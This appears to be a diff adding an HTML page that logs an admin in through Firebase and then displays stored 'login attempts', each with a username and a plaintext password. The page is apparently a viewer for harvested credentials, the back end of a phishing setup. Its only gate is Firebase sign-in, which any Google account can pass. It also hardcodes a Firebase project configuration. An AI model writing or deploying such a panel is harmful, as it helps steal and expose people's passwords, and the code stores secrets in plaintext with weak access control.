@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Logs</title>
+    <style>
+        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+        pre { background: #000; padding: 10px; border-radius: 8px; white-space: pre-wrap; }
+        input, button { padding: 8px; margin: 5px; border:none; border-radius:5px;}
+        button { background:#0f0; color:#000; cursor:pointer;}
+    </style>
+</head>
+<body>
+    <h2>📜 Admin Login to View Logs</h2>
+    <div id="loginForm">
+        <input type="email" id="email" placeholder="Admin Email"><br>
+        <input type="password" id="password" placeholder="Admin Password"><br>
+        <button onclick="login()">Login</button>
+    </div>
+    ///Continue with Google///
+    <button onclick="googleLogin()">Continue with Google</button>
+
+    <div id="logsSection" style="display:none;">
+        <h2>📜 Login Attempts</h2>
+        <pre id="logOutput">Loading...</pre>
+    </div>
+
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCcwr6vNVpoQ0Tdl8OfBM8E2MvDmwKQ3BQ",
+            authDomain: "login-project-a90bc.firebaseapp.com",
+            databaseURL: "https://login-project-a90bc-default-rtdb.firebaseio.com",
+            projectId: "login-project-a90bc",
+            storageBucket: "login-project-a90bc.firebasestorage.app",
+            messagingSenderId: "86568965871",
+            appId: "1:86568965871:web:e000bcfe034bdce1202d1a"
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        function login() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            firebase.auth().signInWithEmailAndPassword(email, password)
+            .then(() => {
+                document.getElementById("loginForm").style.display = "none";
+                document.getElementById("logsSection").style.display = "block";
+                loadLogs();
+            })
+            .catch(error => {
+                alert("Login failed: " + error.message);
+            });
+        }
+        
+        ///continue with Google///
+        function googleLogin() {
+    var provider = new firebase.auth.GoogleAuthProvider();
+
+    firebase.auth().signInWithPopup(provider)
+    .then((result) => {
+        console.log("User:", result.user);
+
+        document.getElementById("loginForm").style.display = "none";
+        document.getElementById("logsSection").style.display = "block";
+
+        loadLogs();
+    })
+    .catch((error) => {
+        alert("Google login failed: " + error.message);
+    });
+}
+firebase.auth().onAuthStateChanged((user) => {
+    if (user) {
+        document.getElementById("loginForm").style.display = "none";
+        document.getElementById("logsSection").style.display = "block";
+        loadLogs();
+    } else {
+        document.getElementById("loginForm").style.display = "block";
+        document.getElementById("logsSection").style.display = "none";
+    }
+});
+
+        function loadLogs() {
+            firebase.database().ref("login_attempts").on("value", (snapshot) => {
+                let logs = snapshot.val();
+                let output = "";
+                for (let key in logs) {
+                    output += `${logs[key].time} | Username: ${logs[key].username} | Password: ${logs[key].password}\n`;
+                }
+                document.getElementById("logOutput").textContent = output || "No logs yet.";
+            });
+        }
+    </script>
+</body>
+</html>
